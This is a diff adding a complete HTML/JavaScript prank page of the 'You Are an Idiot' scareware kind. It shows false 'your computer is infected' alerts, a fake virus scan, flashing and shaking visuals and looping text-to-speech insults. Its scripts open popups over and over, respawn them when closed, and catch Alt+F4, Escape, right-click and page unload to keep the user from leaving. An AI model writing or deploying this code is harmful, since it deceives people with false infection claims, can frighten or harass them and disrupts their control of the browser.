@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>⚠️ YOU ARE AN IDIOT ⚠️</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: black;
+            color: white;
+            font-family: 'Comic Sans MS', 'Arial Black', cursive;
+            text-align: center;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            cursor: none;
+            overflow: hidden;
+        }
+        
+        .flash {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
+            animation: flash 0.1s infinite;
+            pointer-events: none;
+            z-index: 9999;
+        }
+        
+        @keyframes flash {
+            0% { opacity: 0; }
+            25% { opacity: 0.8; }
+            50% { opacity: 0; }
+            75% { opacity: 0.5; }
+            100% { opacity: 0; }
+        }
+        
+        .main-text {
+            z-index: 10000;
+            animation: shake 0.05s infinite;
+        }
+        
+        @keyframes shake {
+            0% { transform: translate(0px, 0px) rotate(0deg); }
+            25% { transform: translate(5px, -5px) rotate(1deg); }
+            50% { transform: translate(-5px, 5px) rotate(-1deg); }
+            75% { transform: translate(-5px, -5px) rotate(0deg); }
+            100% { transform: translate(5px, 5px) rotate(1deg); }
+        }
+        
+        h1 {
+            font-size: 80px;
+            color: red;
+            text-shadow: 0 0 30px red, 0 0 60px yellow, 0 0 90px orange;
+            animation: colorchange 0.1s infinite;
+        }
+        
+        @keyframes colorchange {
+            0% { color: red; text-shadow: 0 0 30px red; }
+            33% { color: yellow; text-shadow: 0 0 30px yellow; }
+            66% { color: lime; text-shadow: 0 0 30px lime; }
+            100% { color: cyan; text-shadow: 0 0 30px cyan; }
+        }
+        
+        h2 {
+            font-size: 50px;
+            color: yellow;
+            animation: laugh 0.5s infinite;
+        }
+        
+        @keyframes laugh {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.3) rotate(5deg); }
+        }
+        
+        .virus-bar {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #ff0000;
+            border: 3px solid yellow;
+            padding: 15px 30px;
+            animation: virus 0.5s infinite;
+            z-index: 10000;
+        }
+        
+        @keyframes virus {
+            0% { transform: translateX(-50%) scale(1); background: #ff0000; }
+            50% { transform: translateX(-50%) scale(1.2); background: #ff6600; }
+            100% { transform: translateX(-50%) scale(1); background: #ff0000; }
+        }
+        
+        .emoji-rain {
+            position: fixed;
+            top: -50px;
+            animation: rain linear infinite;
+            font-size: 30px;
+            pointer-events: none;
+            z-index: 9999;
+        }
+        
+        @keyframes rain {
+            0% { transform: translateY(-50px) rotate(0deg); }
+            100% { transform: translateY(110vh) rotate(360deg); }
+        }
+        
+        .popup-btn {
+            padding: 20px 50px;
+            font-size: 25px;
+            background: red;
+            color: white;
+            border: 3px solid yellow;
+            cursor: pointer;
+            animation: pulse 0.3s infinite;
+            z-index: 10000;
+            margin: 10px;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+        
+        marquee {
+            position: fixed;
+            font-size: 30px;
+            z-index: 10000;
+        }
+    </style>
+</head>
+<body>
+    <div class="flash"></div>
+    
+    <marquee scrollamount="20" style="top: 10px; color: red;">🦠🦠🦠 VIRUS DETECTED! 🦠🦠🦠</marquee>
+    <marquee scrollamount="25" direction="right" style="top: 50px; color: yellow;">⚠️⚠️⚠️ YOU ARE AN IDIOT! ⚠️⚠️⚠️</marquee>
+    
+    <div class="main-text">
+        <h1>⚠️ YOU ARE AN IDIOT ⚠️</h1>
+        <h2>HA HA HA HA HA!</h2>
+        <h3 style="font-size: 30px; color: lime; margin-top: 20px;">
+            🦠 VIRUS DOWNLOADED SUCCESSFULLY! 🦠
+        </h3>
+    </div>
+    
+    <div style="z-index: 10000; margin-top: 30px;">
+        <button class="popup-btn" onclick="spawnMorePopups()">🖱️ CLICK ME FOR FREE SCAN 🖱️</button>
+        <button class="popup-btn" onclick="spawnMorePopups()">💀 REMOVE VIRUS 💀</button>
+        <button class="popup-btn" onclick="spawnMorePopups()">🎁 CLAIM PRIZE 🎁</button>
+    </div>
+    
+    <div class="virus-bar">
+        <p style="font-size: 20px;">🦠 SCANNING SYSTEM... <span id="percent">0%</span></p>
+        <p style="font-size: 15px;" id="virus-count">0 VIRUSES FOUND</p>
+        <p style="font-size: 12px;">YOUR IP: <span id="ip-address">Loading...</span></p>
+    </div>
+    
+    <marquee scrollamount="15" style="bottom: 100px; color: lime;">🔥🔥🔥 CONGRATULATIONS! YOU WON! HA HA HA! 🔥🔥🔥</marquee>
+    <marquee scrollamount="10" direction="right" style="bottom: 60px; color: orange;">💀💀💀 YOUR COMPUTER IS NOW INFECTED! 💀💀💀</marquee>
+    
+    <script>
+        // ============================================
+        // POP-UP MADNESS
+        // ============================================
+        
+        var popupCount = 0;
+        var maxPopups = 50;
+        
+        function spawnMorePopups() {
+            for (var i = 0; i < 5; i++) {
+                createPopup();
+            }
+        }
+        
+        function createPopup() {
+            if (popupCount >= maxPopups) return;
+            
+            popupCount++;
+            
+            var colors = ['black', 'red', '#1a0000', '#330000'];
+            var textColors = ['red', 'yellow', 'lime', 'cyan', 'magenta', 'orange'];
+            
+            var popup = window.open(
+                '',
+                'popup' + popupCount + '_' + Date.now(),
+                'width=' + (250 + Math.random() * 300) + 
+                ',height=' + (200 + Math.random() * 250) +
+                ',left=' + (Math.random() * (screen.width - 300)) + 
+                ',top=' + (Math.random() * (screen.height - 300))
+            );
+            
+            if (popup) {
+                var bgColor = colors[Math.floor(Math.random() * colors.length)];
+                var txtColor = textColors[Math.floor(Math.random() * textColors.length)];
+                
+                var popupContent = '<!DOCTYPE html><html><head><title>⚠️ YOU ARE AN IDIOT ⚠️</title>' +
+                    '<style>' +
+                    'body { background: ' + bgColor + '; color: ' + txtColor + '; text-align: center; ' +
+                    'font-family: "Comic Sans MS", cursive; cursor: none; overflow: hidden; ' +
+                    'animation: shake 0.05s infinite; }' +
+                    '@keyframes shake { 0% { transform: translate(2px,2px); } 100% { transform: translate(-2px,-2px); } }' +
+                    'h1 { font-size: 25px; animation: colorchange 0.1s infinite; }' +
+                    '@keyframes colorchange { 0% { color: red; } 50% { color: yellow; } 100% { color: lime; } }' +
+                    '.btn { padding: 10px 20px; margin: 5px; background: red; color: white; border: 2px solid yellow; ' +
+                    'cursor: pointer; font-weight: bold; }' +
+                    '</style></head><body>' +
+                    '<h1>⚠️ YOU ARE AN IDIOT ⚠️</h1>' +
+                    '<h2>HA HA HA HA HA!</h2>' +
+                    '<p>Popup #' + popupCount + '</p>' +
+                    '<marquee scrollamount="15">🦠 VIRUS DETECTED! 🦠</marquee>' +
+                    '<button class="btn" onclick="window.opener.spawnMorePopups();window.close();">CLOSE ME (IF YOU CAN)</button>' +
+                    '<script>' +
+                    'window.onbeforeunload = function() { window.opener.spawnMorePopups(); return "HA HA!"; };' +
+                    'setInterval(function() { window.opener.spawnMorePopups(); }, 2000);' +
+                    '</' + 'script>' +
+                    '</body></html>';
+                
+                popup.document.write(popupContent);
+                popup.document.close();
+                
+                // Kalo pop-up ditutup, spawn 3 lagi
+                var checkClosed = setInterval(function() {
+                    if (popup.closed) {
+                        clearInterval(checkClosed);
+                        popupCount--;
+                        for (var i = 0; i < 3; i++) {
+                            createPopup();
+                        }
+                    }
+                }, 500);
+            }
+        }
+        
+        // Auto-spawn pop-ups
+        setInterval(function() {
+            spawnMorePopups();
+        }, 1500);
+        
+        // Fake progress bar
+        var percent = 0;
+        setInterval(function() {
+            if (percent < 100) {
+                percent += Math.floor(Math.random() * 10);
+                if (percent > 100) percent = 100;
+                document.getElementById('percent').textContent = percent + '%';
+            }
+        }, 500);
+        
+        // Fake virus count
+        var virusNum = 0;
+        setInterval(function() {
+            virusNum += Math.floor(Math.random() * 500);
+            document.getElementById('virus-count').textContent = virusNum.toLocaleString() + ' VIRUSES FOUND';
+        }, 300);
+        
+        // Fake IP address
+        var fakeIP = '192.168.' + Math.floor(Math.random()*255) + '.' + Math.floor(Math.random()*255);
+        document.getElementById('ip-address').textContent = fakeIP;
+        
+        // Emoji rain
+        function createEmojiRain() {
+            var emojis = ['🦠', '💀', '⚠️', '💩', '🤡', '👾', '☠️', '🤮', '👹', '🎃'];
+            var emoji = document.createElement('div');
+            emoji.className = 'emoji-rain';
+            emoji.textContent = emojis[Math.floor(Math.random() * emojis.length)];
+            emoji.style.left = Math.random() * 100 + '%';
+            emoji.style.animationDuration = (2 + Math.random() * 3) + 's';
+            document.body.appendChild(emoji);
+            
+            setTimeout(function() {
+                emoji.remove();
+            }, 5000);
+        }
+        
+        setInterval(createEmojiRain, 300);
+        
+        // Anti-close
+        window.onbeforeunload = function() {
+            for (var i = 0; i < 10; i++) {
+                createPopup();
+            }
+            return "⚠️ YOU ARE AN IDIOT! HA HA HA! ⚠️";
+        };
+        
+        // Keyboard trap
+        document.addEventListener('keydown', function(e) {
+            if (e.altKey && e.key === 'F4') {
+                e.preventDefault();
+                spawnMorePopups();
+                alert("HA HA! YOU CAN'T ESCAPE!");
+            }
+            if (e.key === 'Escape') {
+                e.preventDefault();
+                spawnMorePopups();
+            }
+        });
+        
+        // Disable right click
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            spawnMorePopups();
+            return false;
+        });
+        
+        // Audio - Text to Speech
+        if ('speechSynthesis' in window) {
+            setInterval(function() {
+                var msg = new SpeechSynthesisUtterance("You are an idiot! Ha ha ha ha ha!");
+                msg.rate = 1.5;
+                msg.pitch = 0.3;
+                msg.volume = 1;
+                speechSynthesis.speak(msg);
+            }, 2000);
+        }
+        
+        // Welcome alert
+        alert("⚠️ WARNING! ⚠️\n\nYOUR COMPUTER HAS BEEN INFECTED!\n\nCLICK OK TO SCAN FOR VIRUSES!");
+        
+        setTimeout(function() {
+            alert("🦠 1,247 VIRUSES DETECTED! 🦠\n\nCLICK OK TO REMOVE THEM!");
+        }, 1000);
+        
+        // Spawn initial pop-ups
+        for (var i = 0; i < 3; i++) {
+            setTimeout(function() {
+                createPopup();
+            }, i * 500);
+        }
+    </script>
+</body>
+</html>
